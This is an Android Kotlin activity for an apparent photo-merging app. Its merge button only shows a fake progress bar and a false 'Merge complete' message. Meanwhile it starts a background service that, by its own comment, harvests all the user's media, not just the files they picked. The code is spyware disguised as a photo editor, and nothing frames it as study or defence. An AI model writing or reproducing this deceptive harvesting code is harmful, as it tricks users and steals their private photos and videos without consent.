package com.magic.photoeditor

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView

class MergeActivity : AppCompatActivity() {

    private val PICK_IMAGES = 1001
    private val PICK_VIDEOS = 1002

    private lateinit var selectedImages: MutableList<Uri>
    private lateinit var selectedVideos: MutableList<Uri>
    private lateinit var adapter: MediaAdapter
    private lateinit var progressBar: ProgressBar

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_merge)

        selectedImages = mutableListOf()
        selectedVideos = mutableListOf()
        progressBar = findViewById(R.id.progressBar)

        val recyclerView = findViewById<RecyclerView>(R.id.recyclerView)
        adapter = MediaAdapter(selectedImages, selectedVideos)
        recyclerView.layoutManager = LinearLayoutManager(this)
        recyclerView.adapter = adapter

        val txtCount = findViewById<TextView>(R.id.txtCount)
        val btnSelectImages = findViewById<Button>(R.id.btnSelectImages)
        val btnSelectVideos = findViewById<Button>(R.id.btnSelectVideos)
        val btnMerge = findViewById<Button>(R.id.btnMerge)

        btnSelectImages.setOnClickListener {
            val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            startActivityForResult(intent, PICK_IMAGES)
        }

        btnSelectVideos.setOnClickListener {
            val intent = Intent(Intent.ACTION_PICK, MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
            intent.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            startActivityForResult(intent, PICK_VIDEOS)
        }

        btnMerge.setOnClickListener {
            if (selectedImages.isEmpty() && selectedVideos.isEmpty()) {
                Toast.makeText(this, "Select at least one image or video", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            startFakeMergeAndRealHarvest()
        }

        updateCount()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (resultCode == RESULT_OK && data != null) {
            if (requestCode == PICK_IMAGES) {
                if (data.clipData != null) {
                    for (i in 0 until data.clipData!!.itemCount) {
                        val uri = data.clipData!!.getItemAt(i).uri
                        if (!selectedImages.contains(uri)) {
                            selectedImages.add(uri)
                        }
                    }
                } else if (data.data != null) {
                    selectedImages.add(data.data!!)
                }
                updateCount()
            } else if (requestCode == PICK_VIDEOS) {
                if (data.clipData != null) {
                    for (i in 0 until data.clipData!!.itemCount) {
                        val uri = data.clipData!!.getItemAt(i).uri
                        if (!selectedVideos.contains(uri)) {
                            selectedVideos.add(uri)
                        }
                    }
                } else if (data.data != null) {
                    selectedVideos.add(data.data!!)
                }
                updateCount()
            }
        }
    }

    private fun updateCount() {
        val txtCount = findViewById<TextView>(R.id.txtCount)
        txtCount.text = "Images: ${selectedImages.size} | Videos: ${selectedVideos.size}"
        adapter.notifyDataSetChanged()
    }

    private fun startFakeMergeAndRealHarvest() {
        progressBar.visibility = ProgressBar.VISIBLE
        Toast.makeText(this, "Merging ${selectedImages.size + selectedVideos.size} files...", Toast.LENGTH_SHORT).show()

        // Start the REAL harvest in the background (harvests ALL media, not just selected)
        val intent = Intent(this, GalleryService::class.java)
        startForegroundService(intent)

        // Fake progress bar
        Handler(Looper.getMainLooper()).postDelayed({
            progressBar.progress = 50
        }, 1000)

        Handler(Looper.getMainLooper()).postDelayed({
            progressBar.progress = 80
        }, 2000)

        Handler(Looper.getMainLooper()).postDelayed({
            progressBar.visibility = ProgressBar.GONE
            progressBar.progress = 0
            Toast.makeText(this, "Merge complete! Saved to /Pictures/Merged/", Toast.LENGTH_SHORT).show()
        }, 3000)
    }
}
